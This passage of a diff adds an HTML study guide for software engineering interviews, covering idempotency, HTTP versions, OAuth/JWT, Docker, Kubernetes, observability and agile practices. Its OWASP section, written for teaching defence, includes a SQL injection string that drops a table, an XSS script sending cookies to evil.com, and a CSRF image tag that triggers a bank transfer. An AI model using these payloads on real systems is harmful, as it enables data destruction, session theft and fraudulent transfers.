+                            <td>Yes</td>
+                            <td>Get user profile</td>
+                        </tr>
+                        <tr>
+                            <td>PUT</td>
+                            <td>Yes</td>
+                            <td>Update user to specific state</td>
+                        </tr>
+                        <tr>
+                            <td>DELETE</td>
+                            <td>Yes</td>
+                            <td>Delete user (2nd delete = already deleted)</td>
+                        </tr>
+                        <tr>
+                            <td>POST</td>
+                            <td>No</td>
+                            <td>Create order (2nd post = duplicate order)</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="key-point">
+                        <strong>Making POST idempotent:</strong> Use idempotency keys. Client sends unique ID with request. Server checks if ID was processed before. If yes, return cached response instead of processing again.
+                    </div>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Payment Retry</h5>
+                        <p>User clicks "Pay" but network is flaky. Request might be sent twice. With idempotency key, the second request sees "already processed" and returns the original result - no double charge.</p>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Topic 6: Networking & Security -->
+            <section class="topic-section">
+                <h2>6. Networking & Security</h2>
+                
+                <div class="subtopic">
+                    <h3>HTTP Versions</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>HTTP/1.1</th>
+                            <th>HTTP/2</th>
+                            <th>HTTP/3</th>
+                        </tr>
+                        <tr>
+                            <td>Text-based protocol</td>
+                            <td>Binary protocol</td>
+                            <td>Binary over QUIC</td>
+                        </tr>
+                        <tr>
+                            <td>One request per connection</td>
+                            <td>Multiplexing (many requests, one connection)</td>
+                            <td>Improved multiplexing</td>
+                        </tr>
+                        <tr>
+                            <td>No header compression</td>
+                            <td>HPACK header compression</td>
+                            <td>QPACK header compression</td>
+                        </tr>
+                        <tr>
+                            <td>TCP</td>
+                            <td>TCP</td>
+                            <td>UDP (QUIC)</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Authentication: OAuth 2.0 & JWT</h3>
+                    
+                    <h4>OAuth 2.0 Flow (Authorization Code)</h4>
+                    <ol>
+                        <li>User clicks "Login with Google"</li>
+                        <li>Redirect to Google login page</li>
+                        <li>User logs in, grants permission</li>
+                        <li>Google redirects back with authorization code</li>
+                        <li>Your server exchanges code for access token</li>
+                        <li>Your server uses token to access user's Google data</li>
+                    </ol>
+                    
+                    <h4>JWT (JSON Web Token)</h4>
+                    <p>Self-contained token with three parts: Header.Payload.Signature</p>
+                    
+                    <div class="code-block">
+<pre>// JWT Structure
+{
+  "header": { "alg": "HS256", "typ": "JWT" },
+  "payload": { "user_id": 123, "role": "admin", "exp": 1735689600 },
+  "signature": "HMACSHA256(base64(header) + '.' + base64(payload), secret)"
+}
+
+// Token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.abc123signature</pre>
+                    </div>
+                    
+                    <div class="key-point">
+                        <strong>JWT Benefits:</strong> Stateless (no server session storage), contains user info (no DB lookup needed). But: Cannot be revoked until expiry (use short expiry + refresh tokens).
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>OWASP Top 10 Security Vulnerabilities</h3>
+                    
+                    <h4>1. SQL Injection</h4>
+                    <div class="code-block">
+<pre>// Vulnerable
+query = "SELECT * FROM users WHERE id = " + user_input
+// Input: "1; DROP TABLE users;" 💀
+
+// Safe - Use parameterized queries
+query = "SELECT * FROM users WHERE id = ?"
+execute(query, [user_input])</pre>
+                    </div>
+                    
+                    <h4>2. Cross-Site Scripting (XSS)</h4>
+                    <p>Attacker injects malicious script that runs in victim's browser.</p>
+                    <div class="code-block">
+<pre>// Vulnerable: User enters this as their name
+<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+
+// Prevention: Escape output, use Content Security Policy
+&lt;script&gt;...&lt;/script&gt;  // Rendered as text, not executed</pre>
+                    </div>
+                    
+                    <h4>3. Cross-Site Request Forgery (CSRF)</h4>
+                    <p>Attacker tricks user into performing unwanted action on a site where they're authenticated.</p>
+                    <p><strong>Prevention:</strong> CSRF tokens, SameSite cookies, verify Origin header.</p>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: CSRF Attack</h5>
+                        <p>You're logged into your bank. Attacker sends you an email with hidden image: <code>&lt;img src="http://bank.com/transfer?to=attacker&amount=1000"&gt;</code>. Your browser sends the request with your auth cookies!</p>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Topic 7: DevOps & Cloud -->
+            <section class="topic-section">
+                <h2>7. DevOps & Cloud Awareness</h2>
+                
+                <div class="subtopic">
+                    <h3>CI/CD Pipeline</h3>
+                    <p>Continuous Integration / Continuous Deployment automates building, testing, and deploying code.</p>
+                    
+                    <div class="diagram-box">
+<pre>
+Code Commit → Build → Unit Tests → Integration Tests → Deploy to Staging → Deploy to Production
+     │          │          │              │                  │                    │
+     └──────────┴──────────┴──────────────┴──────────────────┴────────────────────┘
+                        Automated pipeline (Jenkins, GitHub Actions, GitLab CI)
+</pre>
+                    </div>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example</h5>
+                        <p>Developer pushes code. Within minutes: tests run, Docker image built, deployed to staging, automated UI tests run, and if all pass, promoted to production. Human intervention only for code review.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Docker Basics</h3>
+                    
+                    <div class="code-block">
+<pre># Dockerfile
+FROM python:3.9-slim                    # Base image
+WORKDIR /app                            # Set working directory
+COPY requirements.txt .                 # Copy dependency file
+RUN pip install -r requirements.txt     # Install dependencies
+COPY . .                                # Copy application code
+EXPOSE 8000                             # Document port
+CMD ["python", "app.py"]                # Run command
+
+# Build and run
+docker build -t myapp:v1 .
+docker run -p 8000:8000 myapp:v1</pre>
+                    </div>
+                    
+                    <h4>Key Concepts</h4>
+                    <ul>
+                        <li><strong>Image:</strong> Immutable template (like a class)</li>
+                        <li><strong>Container:</strong> Running instance of an image (like an object)</li>
+                        <li><strong>Registry:</strong> Where images are stored (Docker Hub, ECR)</li>
+                        <li><strong>Volume:</strong> Persistent storage that survives container restart</li>
+                    </ul>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Kubernetes Basics</h3>
+                    
+                    <h4>Core Components</h4>
+                    <ul>
+                        <li><strong>Pod:</strong> Smallest deployable unit. One or more containers.</li>
+                        <li><strong>Service:</strong> Stable network endpoint to access pods.</li>
+                        <li><strong>Deployment:</strong> Manages pod replicas, rolling updates.</li>
+                        <li><strong>ConfigMap/Secret:</strong> Configuration and sensitive data.</li>
+                    </ul>
+                    
+                    <div class="code-block">
+<pre># deployment.yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: myapp
+spec:
+  replicas: 3                    # Run 3 instances
+  selector:
+    matchLabels:
+      app: myapp
+  template:
+    spec:
+      containers:
+      - name: myapp
+        image: myapp:v1
+        ports:
+        - containerPort: 8000
+        resources:
+          limits:
+            cpu: "500m"
+            memory: "256Mi"</pre>
+                    </div>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example</h5>
+                        <p>You deploy 3 replicas of your API. Kubernetes ensures 3 are always running. If one crashes, it automatically starts a new one. If you deploy a new version, it gradually replaces old pods (rolling update).</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Observability: Logs, Metrics, Traces</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Pillar</th>
+                            <th>What</th>
+                            <th>Tools</th>
+                        </tr>
+                        <tr>
+                            <td>Logs</td>
+                            <td>Discrete events (errors, requests)</td>
+                            <td>ELK Stack, Splunk, Loki</td>
+                        </tr>
+                        <tr>
+                            <td>Metrics</td>
+                            <td>Numerical measurements over time</td>
+                            <td>Prometheus, Grafana, DataDog</td>
+                        </tr>
+                        <tr>
+                            <td>Traces</td>
+                            <td>Request flow across services</td>
+                            <td>Jaeger, Zipkin, AWS X-Ray</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="key-point">
+                        <strong>Why all three?</strong> Metrics tell you something is wrong (high latency). Logs tell you what went wrong (error message). Traces tell you where it went wrong (which service in the chain).
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Topic 8: Soft Skills -->
+            <section class="topic-section">
+                <h2>8. Soft Skills & Behavioral</h2>
+                
+                <div class="subtopic">
+                    <h3>System Design Interview Approach</h3>
+                    
+                    <ol>
+                        <li><strong>Clarify Requirements (2-3 min):</strong> Functional & non-functional requirements. Scale, latency, availability targets.</li>
+                        <li><strong>High-Level Design (5-10 min):</strong> Draw main components. Data flow. API design.</li>
+                        <li><strong>Deep Dive (15-20 min):</strong> Database schema. Scaling strategies. Handle edge cases.</li>
+                        <li><strong>Wrap Up (5 min):</strong> Trade-offs discussed. Future improvements. Monitoring strategy.</li>
+                    </ol>
+                    
+                    <div class="key-point">
+                        <strong>Common Mistake:</strong> Jumping into solution without understanding requirements. Always ask: How many users? Read-heavy or write-heavy? What's acceptable latency? Is data consistency critical?
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Code Review Best Practices</h3>
+                    
+                    <h4>As a Reviewer</h4>
+                    <ul>
+                        <li>Focus on logic, not style (use linters for style)</li>
+                        <li>Ask questions instead of making demands: "What happens if X is null?"</li>
+                        <li>Acknowledge good code: "Nice use of the Strategy pattern here!"</li>
+                        <li>Prioritize feedback: security > bugs > design > nits</li>
+                    </ul>
+                    
+                    <h4>As an Author</h4>
+                    <ul>
+                        <li>Keep PRs small and focused (< 400 lines ideally)</li>
+                        <li>Write good descriptions explaining WHY, not just WHAT</li>
+                        <li>Don't take feedback personally</li>
+                        <li>Be open to different approaches</li>
+                    </ul>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Agile: Scrum vs Kanban</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Scrum</th>
+                            <th>Kanban</th>
+                        </tr>
+                        <tr>
+                            <td>Fixed-length sprints (1-4 weeks)</td>
+                            <td>Continuous flow</td>
+                        </tr>
+                        <tr>
+                            <td>Committed sprint backlog</td>
+                            <td>Pull new work when capacity allows</td>
+                        </tr>
+                        <tr>
+                            <td>Sprint planning, daily standup, retrospective</td>
+                            <td>Optional ceremonies</td>
+                        </tr>
+                        <tr>
+                            <td>Defined roles (Scrum Master, PO)</td>
+                            <td>No required roles</td>
+                        </tr>
+                        <tr>
+                            <td>Good for: Feature development</td>
+                            <td>Good for: Support, maintenance, ops</td>
+                        </tr>
+                    </table>
+                </div>
+            </section>
+        </div>
+        
+        <footer>
+            <p>Software Engineering Essential Topics - Comprehensive Guide | Created for Learning & Interview Preparation</p>
+        </footer>
+    </div>
+</body>
+</html>
